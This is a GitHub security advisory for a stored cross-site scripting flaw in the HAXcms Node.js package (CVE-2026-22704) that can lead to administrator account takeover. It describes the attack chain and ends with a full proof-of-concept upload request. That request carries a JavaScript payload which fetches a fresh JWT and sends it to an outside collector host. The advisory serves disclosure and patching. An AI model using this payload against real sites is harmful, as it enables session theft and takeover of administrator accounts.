# [H] HAXcms Has Stored XSS Vulnerability that May Lead to Account Takeover

## Summary
Severity: High
Advisory: GHSA-3fm2-xfq7-7778
CVE: CVE-2026-22704
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:L/UI:R/S:C/C:H/I:H/A:H (CVSS_V3)
Published: 2026-01-13
Source: https://github.com/advisories/GHSA-3fm2-xfq7-7778
Type: github-advisory

## Affected
- npm: `@haxtheweb/haxcms-nodejs` — affected >=11.0.6 <25.0.0

## Details
### Summary
Stored XSS Leading to Account Takeover

### Details
The Exploit Chain:
1.Upload: The attacker uploads an `.html` file containing a JavaScript payload.
2.Execution: A logged-in administrator is tricked into visiting the URL of this uploaded file.
3.Token Refresh: The JavaScript payload makes a `fetch` request to the `/system/api/refreshAccessToken` endpoint. Because the administrator is logged in, their browser automatically attaches the `haxcms_refresh_token` cookie to this request.
4.JWT Theft: The server validates the refresh token and responds with a new, valid JWT access token in the JSON response.
5.Exfiltration: The JavaScript captures this new JWT from the response and sends it to an attacker-controlled server.
6.Account Takeover: The attacker now possesses a valid administrator JWT and can take full control of the application.

Vulnerability recurrence:

<img width="1198" height="756" alt="image" src="https://github.com/user-attachments/assets/7062d542-702e-4cbe-8493-da0f71e790c3" />

Then we test access to this html

<img width="1433" height="1019" alt="image" src="https://github.com/user-attachments/assets/6c72c92f-a151-4b0e-b6ba-d83ffb771253" />

You can obtain other people's identity information

<img width="1082" height="290" alt="image" src="https://github.com/user-attachments/assets/23398ea4-f08c-47bd-b2f1-89071af0e275" />


### PoC
POST /system/api/saveFile?siteName=yu&site_token=neWmRyvNbCCwiQ7MP2ojAjVMk-HtjlKYNOqsQjLt3RQ&jwt=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZCI6IlVqUzd6NFRFano1Q2xUMERiNnU0RmFROWJZSXgyMjd5OHN2NzRWb1hLbFkiLCJpYXQiOjE3NTUyNDYxODYsImV4cCI6MTc1NTI0NzA4NiwidXNlciI6ImFkbWluIn0.XrXr427aKbyw97aDjD2OX128DznGtw_CHMALAeodb0M HTTP/1.1
Host: 192.168.1.72:8080
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
Connection: close
Content-Length: 1128

------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="bulk-import"

true
------WebKitFormBoundary7MA4YWxkTrZu0gW
Content-Disposition: form-data; name="file-upload"; filename="files/pwn1116.html"
Content-Type: text/plain

<script>
  // This version adds headers to make the request look more legitimate.
  fetch('/system/api/refreshAccessToken', {
    method: 'POST',
    headers: {
      'Content-Type': 'application/json'
    },
    body: '{}' // Sending an empty JSON object body
  })
  .then(response => {
    if (!response.ok) {
        throw new Error('Network response was not ok ' + response.statusText);
    }
    return response.json();
  })
  .then(data => {
    var stolenJWT = data.jwt;
    var attackerUrl = 'https://zqtqii0n7ptm168btd4htrntrkxbl29r.oastify.com/log?jwt=' + stolenJWT;
    fetch(attackerUrl);
  })
  .catch(error => {
    var attackerUrl = 'https://zqtqii0n7ptm168btd4htrntrkxbl29r.oastify.com/log?error=' + error.message;
    fetch(attackerUrl);
  });
</script>
<h1>Processing your request...</h1>
------WebKitFormBoundary7MA4YWxkTrZu0gW--


### Impact
The attacker now possesses a valid administrator JWT and can take full control of the application.

## References
- https://github.com/haxtheweb/issues/security/advisories/GHSA-3fm2-xfq7-7778
- https://nvd.nist.gov/vuln/detail/CVE-2026-22704
- https://github.com/haxtheweb/haxcms-nodejs/commit/317a8ae29f88be389f7cfeffaef416957122d97e
- https://github.com/haxtheweb/haxcms-nodejs/releases/tag/v25.0.0
- https://github.com/haxtheweb/issues
